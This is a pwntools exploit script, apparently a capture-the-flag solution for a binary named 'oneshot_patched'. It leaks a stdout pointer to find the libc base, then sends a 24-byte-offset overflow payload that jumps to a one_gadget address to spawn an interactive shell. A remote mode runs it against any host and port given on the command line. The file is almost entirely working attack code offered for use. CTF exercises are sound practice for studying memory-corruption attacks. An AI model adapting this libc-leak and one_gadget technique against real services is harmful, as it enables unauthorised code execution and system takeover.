#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('oneshot_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0xaa2
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    
    io.recvuntil(b"stdout: ")
    stdout = int(io.recvline().strip(), 16)
    libc.address = stdout - libc.sym['_IO_2_1_stdout_']
    info("libc base: %#x", libc.address)

    og = libc.address + 0xf1147
    offset = 24

    payload = flat({
        offset: [
            0x0,
            b"A"*8,
            og
        ]
    })

    io.recvuntil(b"MSG:")
    io.send(payload)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

